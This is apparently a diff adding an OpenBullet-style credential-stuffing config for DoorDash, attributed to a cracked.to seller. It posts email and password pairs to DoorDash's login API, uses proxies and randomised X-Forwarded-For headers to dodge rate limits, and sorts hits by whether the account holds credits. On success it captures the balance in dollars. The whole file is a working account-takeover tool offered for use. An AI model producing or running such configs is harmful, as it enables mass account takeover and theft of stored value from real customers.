@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "DoorDash",
+  "SuggestedBots": 150,
+  "LastModified": "2018-12-09T11:34:36.2571194+00:00",
+  "AdditionalInfo": "use hq proxies",
+  "Author": "Purchaseables from cracked.to",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1959407482
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+FUNCTION RandomNum 0 255 "" -> VAR "a" 
+FUNCTION RandomNum 0 255 "" -> VAR "b" 
+FUNCTION RandomNum 0 255 "" -> VAR "c" 
+FUNCTION RandomNum 0 255 "" -> VAR "d" 
+REQUEST POST "https://api.doordash.com/v2/auth/web_login/" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Forwarded-For: <a>.<b>.<c>.<d>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Success OR 
+    KEY "last_name" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"account_credits\":0" 
+PARSE "<SOURCE>" LR "\"account_credits\":" "," Recursive=FALSE -> VAR "BAL" "" "" 
+FUNCTION Compute "<BAL>/100" -> VAR "BAL2" 
+PARSE "<BAL2>" LR "" "" Recursive=FALSE -> CAP "Balance" "$" "" 
